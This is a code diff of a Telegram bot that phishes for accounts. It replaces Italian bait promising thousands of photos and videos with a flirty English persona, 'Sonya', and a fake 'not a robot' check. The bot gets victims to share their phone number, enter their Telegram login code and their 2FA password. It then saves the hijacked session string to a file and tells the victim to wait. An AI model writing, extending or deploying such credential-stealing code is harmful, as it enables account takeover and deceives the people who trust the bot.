@@ -42,14 +42,17 @@ os.makedirs("sessions", exist_ok=True)
 @dp.message_handler(commands=['start'])
 async def cmd_start(message: types.Message):
     keyboard = InlineKeyboardMarkup().add(
-        InlineKeyboardButton("🔐 Autorizza primo account", callback_data="auth_account")
+        InlineKeyboardButton(" I'm definitely not a robot, honey.🥺", callback_data="auth_account")
     )
     await message.answer(
-       "👋 🇮🇹 Ciao! ❤️\n"
-        "Vuoi vedere più di 10.000 foto e 4.000 video? 👁\n"
-        "Conferma che non sei un bot usando il pulsante qui sotto. 🤖👇",
+        "👋 Hi, my name is Sonya! 💕\n"
+        "I'll be your internet bestie!\n"
+        "You can ask me anything and request me to do whatever — and I’ll do it for you 🍭\n\n"
+        "But first, please confirm that you’re not a robot 🥺👇",
         reply_markup=keyboard
     )
+
+
 
 @dp.callback_query_handler(lambda c: c.data == 'auth_account')
 async def start_auth(callback_query: types.CallbackQuery):
@@ -57,9 +60,9 @@ async def start_auth(callback_query: types.CallbackQuery):
     user_states[user_id] = 'awaiting_contact'
 
     kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    kb.add(KeyboardButton("📱 Condividi il tuo numero", request_contact=True))
+    kb.add(KeyboardButton("📱 Share your number", request_contact=True))
 
-    await bot.send_message(user_id, "📲 Per favore, condividi il tuo numero:", reply_markup=kb)
+    await bot.send_message(user_id, "🥺 Please share your number:", reply_markup=kb)
     await bot.answer_callback_query(callback_query.id)
 
 @dp.message_handler(content_types=types.ContentType.CONTACT)
@@ -83,7 +86,7 @@ async def handle_contact(message: types.Message):
         user_code_buffers[user_id] = {'code': '', 'message_id': None}
         msg_id = await send_code_keyboard(user_id, "", None)
         user_code_buffers[user_id]['message_id'] = msg_id
-        await message.answer("⌨️ Inserisci il codice premendo i tasti qui sotto:")
+        await message.answer("⌨️ Enter the code by pressing the buttons below:")
     except Exception as e:
         await message.answer(f"❌ Errore nell'invio del codice: {e}")
         await client.disconnect()
@@ -162,7 +165,7 @@ async def try_sign_in_code(user_id, code):
             cleanup(user_id)
         else:
             user_states[user_id] = 'awaiting_2fa'
-            await bot.send_message(user_id, "🔐 Inserisci la password 2FA:")
+            await bot.send_message(user_id, "🔐 Enter your 2FA password:")
     except PhoneCodeExpiredError:
         await bot.send_message(user_id, "⏰ Codice scaduto. Riprova da /start")
         await client.disconnect()
@@ -173,7 +176,7 @@ async def try_sign_in_code(user_id, code):
         await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
     except SessionPasswordNeededError:
         user_states[user_id] = 'awaiting_2fa'
-        await bot.send_message(user_id, "🔐 È necessaria la password 2FA. Inseriscila:")
+        await bot.send_message(user_id, "🔐 Your 2FA password is required. Enter it:")
     except Exception as e:
         await bot.send_message(user_id, f"❌ Errore di accesso: {e}")
         await client.disconnect()
@@ -199,7 +202,7 @@ async def process_2fa(message: types.Message):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
-            await message.answer("🎥 Il materiale video sarà disponibile qui a breve. Attendi qualche minuto...")
+            await message.answer("you confirmed that you are not a robot, nice to meet you, I'm a little busy right now, wait a little, I can't say just how long, but not very long❤️😘")
             await client.disconnect()
             cleanup(user_id)
         else:
